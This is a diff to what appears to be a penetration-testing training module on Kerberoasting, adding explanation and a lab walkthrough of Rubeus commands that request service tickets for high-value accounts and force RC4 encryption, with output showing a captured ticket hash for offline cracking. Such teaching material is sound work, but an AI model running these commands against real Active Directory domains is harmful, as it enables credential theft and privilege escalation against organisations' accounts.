@@ -1600,6 +1600,11 @@ PS C:\htb> .\Rubeus.exe kerberoast /stats
 
 ## Rubeus /nowrap Flag
 
+Let's use Rubeus to request tickets for accounts with the `admincount` attribute set to `1`. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. Be sure to specify the `/nowrap` flag so that the hash can be more easily copied down for offline cracking using Hashcat.
+
+Per the documentation, the ""/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function"; therefore, we won't have to worry about trimming white space or newlines before cracking with Hashcat.
+
+
 ```powershell
 PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
 
@@ -1635,6 +1640,29 @@ PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
 ## Rubeus /tgtdeleg Flag
 
 We can use Rubeus with the `/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request.
+
+```powershell
+PS C:\tools> .\Rubeus.exe kerberoast /user:svc_vmwaresso /tgtdeleg
+
+[*] Action: Kerberoasting
+
+[*] Using 'tgtdeleg' to request a TGT for the current user
+[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else
+[*] Target User            : svc_vmwaresso
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+[+] Ticket successfully imported!
+[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=svc_vmwaresso)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+
+[*] SamAccountName         : svc_vmwaresso
+[*] DistinguishedName      : CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+[*] ServicePrincipalName   : vmware/inlanefreight.local
+[*] PwdLastSet             : 4/5/2022 12:32:46 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local*$D2521CDEFAAB740BD9CA34
+```
 
 ![](images/Pasted%20image%2020260107095510.png)
 
